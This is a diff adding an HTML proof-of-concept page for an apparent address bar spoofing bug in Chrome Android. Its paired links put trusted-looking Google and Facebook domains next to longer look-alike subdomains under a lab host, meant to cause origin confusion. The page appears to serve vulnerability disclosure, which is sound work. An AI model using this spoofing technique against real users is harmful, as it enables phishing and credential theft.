@@ -1,0 +1,24 @@
+<html>
+
+<h1>Address Bar Spoofing via Sticky Domain Rendering</h1>
+
+<h2>
+Chrome Android fails to update the visible address bar when navigating from a
+trusted-looking long domain to a longer attacker-controlled subdomain with
+the same prefix, causing origin confusion.
+</h2>
+
+<div>
+<a href="https://www.aaaaa.auths.account.google.c">Open google (.c)</a><br/><br/>
+<a href="https://www.aaaaa.auths.account.google.c.rebelsec.locals">like google.c</a><br/><br/>
+
+<a href="https://www.aaaaa.auths.account.google.ru">Open google (.ru) </a><br/><br/>
+<a href="https://www.aaaaa.auths.account.google.ru.rebelsec.locals">like google.ru (russia) </a><br/><br/>
+
+<a href="https://www.aaaaa.auths.account.facebook.cr">Open facebook (.cr)</a><br/><br/>
+<a href="https://www.aaaaa.auths.account.facebook.cr.rebelsec.locals">Open facebook (.cr)</a><br/><br/>
+
+
+</div>
+
+</html>
